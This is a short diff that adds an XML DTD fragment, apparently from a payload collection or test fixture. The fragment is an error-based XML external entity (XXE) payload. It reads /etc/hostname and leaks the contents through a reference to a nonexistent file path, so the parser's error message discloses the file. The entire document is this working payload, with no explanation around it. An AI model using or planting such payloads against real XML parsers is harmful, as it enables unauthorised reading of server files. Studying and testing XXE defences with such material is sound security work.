@@ -1,0 +1,4 @@
+<!ENTITY % udhaus SYSTEM "file:///etc/hostname">
+<!ENTITY % alskdj "<!ENTITY &#x25; klalksd SYSTEM 'file:///falso/%udhaus;'>">
+%alskdj;
+%klalksd;
